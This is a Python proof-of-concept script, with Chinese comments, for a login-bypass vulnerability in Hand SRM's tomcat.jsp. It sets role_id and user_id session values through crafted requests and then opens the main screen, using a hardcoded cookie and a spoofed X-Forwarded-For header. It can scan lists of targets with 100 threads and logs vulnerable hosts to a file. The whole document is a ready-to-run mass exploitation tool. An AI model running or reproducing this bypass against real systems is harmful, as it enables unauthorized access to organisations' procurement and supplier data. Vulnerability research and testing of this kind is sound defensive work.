# 汉得SRM tomcat.jsp 登录绕过漏洞
import argparse, requests, sys  # 导入所需的库
from multiprocessing.dummy import Pool  # 导入线程池用于并发请求

requests.packages.urllib3.disable_warnings()  # 禁用HTTPS请求的警告

def banner():
    # 打印程序的横幅信息，包括作者信息、日期和版本
    banner = '''  
██╗  ██╗██████╗         ██╗      ██████╗  ██████╗ ██╗███╗   ██╗██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗  
██║  ██║██╔══██╗        ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝  
███████║██║  ██║        ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗  
██╔══██║██║  ██║        ██║     ██║   ██║██║   ██║██║██║╚██╗██║██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║  
██║  ██║██████╔╝███████╗███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║██████╔╝   ██║   ██║     ██║  ██║███████║███████║  
╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝  
                                   author: MOYV  
                                   date: 2024/09/03  
                                   version: 1.0   
'''
    print(banner)  # 输出横幅

def poc(target):
    # 漏洞利用函数，接受目标URL
    # 定义可能用于绕过登录的URL
    url1 = target + "/tomcat.jsp?dataName=role_id&dataValue=1"
    url2 = target + "/tomcat.jsp?dataName=user_id&dataValue=1"
    url3 = target + "/main.screen"

    # 设置HTTP请求头，以伪装浏览器请求
    headers = {
        "Cookie": "JSESSIONID=795720D2D1CD8F8097279385ED10DA03.jvm1;route=7b202f8163dedfdca4c694f2c4cf442b",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Chromium";v="128","Not;A=Brand";v="24","GoogleChrome";v="128"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "Windows",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "X-Forwarded-For": "127.0.0.1",
        "Priority": "u=0,i",
        "Connection": "keep-alive",
    }

    try:
        # 尝试访问目标URL以检查其可用性
        res = requests.get(url=target, verify=False)  # 不验证SSL证书
        if res.status_code == 200:  # 检查响应状态码
            # 尝试访问第一个绕过登录的URL
            res1 = requests.get(url=url1, headers=headers, verify=False, timeout=5)
            if "role_id" in res1.text:  # 检查响应中是否包含"role_id"
                # 如果包含，继续访问第二个URL
                res2 = requests.get(url=url2, headers=headers, verify=False, timeout=5)
                if "user_id" in res2.text:  # 检查响应中是否包含"user_id"
                    # 如果包含，最终尝试访问第三个URL
                    res3 = requests.get(url=url3, headers=headers, verify=False, timeout=5)
                    if res3.status_code == 200:  # 检查响应状态是否为200
                        print(f"[+]{target}存在登录绕过")  # 输出结果，表示存在登录绕过漏洞
                        # 将结果写入文件
                        with open('result.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{target}存在登录绕过\n")
            else:
                print(f"[-]{target}不存在登录绕过")  # 输出结果，表示不存在登录绕过漏洞
    except:
        print(f"[!]{target}可能存在问题，请手动检测")  # 捕获异常并提示可能的问题

def main():
    banner()  # 打印程序横幅
    # 设置命令行参数解析
    parse = argparse.ArgumentParser(description="汉得SRM_tomcat.jsp_登陆绕过漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")  # 文件目标URL
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")  # URL列表文件
    args = parse.parse_args()  # 解析命令行参数

    # 根据输入参数决定执行哪个分支
    if args.url and not args.file:
        poc(args.url)  # 如果提供了URL，调用poc函数进行检测
    elif not args.url and args.file:
        url_list = []  # 创建目标URL列表
        # 读取文件中的URL
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))  # 清理URL并添加到列表
        mp = Pool(100)  # 创建线程池，最多使用100个线程
        mp.map(poc, url_list)  # 并行处理URL列表中的每个目标
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程完成
    else:
        # 提示用户正确的用法
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 主程序入口
if __name__ == '__main__':
    main()  # 调用main函数